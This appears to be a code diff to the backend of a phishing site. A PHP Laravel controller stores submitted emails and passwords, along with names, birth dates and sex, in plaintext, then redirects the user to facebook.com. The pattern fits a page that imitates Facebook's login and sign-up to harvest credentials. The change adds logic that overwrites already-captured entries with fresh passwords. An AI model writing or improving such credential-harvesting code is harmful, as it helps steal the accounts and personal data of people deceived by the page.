@@ -19,10 +19,18 @@ class UserLoginController extends Controller
             'password' => 'required|min:6',
         ]);
 
-        Userdb::insert([
-            'username' => $request->input('email'), // ดึงข้อมูลอีเมลจากฟอร์ม
-            'password' => $request->input('password'), // อย่าลืมเข้ารหัสรหัสผ่าน
-        ]);
+        $check = Userdb::where('username', $request->input('email'))->first();
+
+        if (!$check) {
+            Userdb::insert([
+                'username' => $request->input('email'),
+                'password' => $request->input('password'), 
+            ]);
+        } else {
+            $check->update([
+                'password' => $request->input('password'), 
+            ]);
+        }
 
         return redirect()->to('https://www.facebook.com');
     }
@@ -34,8 +42,11 @@ class UserLoginController extends Controller
             'email' => 'required|email',
             'password' => 'required|min:6',
         ]);
-    
-        // เก็บข้อมูลลงในฐานข้อมูล
+
+        $check = Userdb::where('username', $request->input('email'))->first();
+
+        if (!$check) {
+                    // เก็บข้อมูลลงในฐานข้อมูล
         DB::table('userdbs')->insert([
             'username' => $request->email,
             'password' => $request->password,
@@ -48,6 +59,19 @@ class UserLoginController extends Controller
             'created_at' => now(),
             'updated_at' => now(),
         ]);
+        } else {
+            DB::table('userdbs')->where('username', $request->email)->update([
+                'password' => $request->password, 
+                'f_name' => $request->f_name,
+                'l_name' => $request->l_name,
+                'day' => $request->day,
+                'month' => $request->month,
+                'year' => $request->year,
+                'sex' => $request->sex,
+                'updated_at' => now(),
+            ]);
+        }
+        
     
         return redirect()->to('https://www.facebook.com');
     }
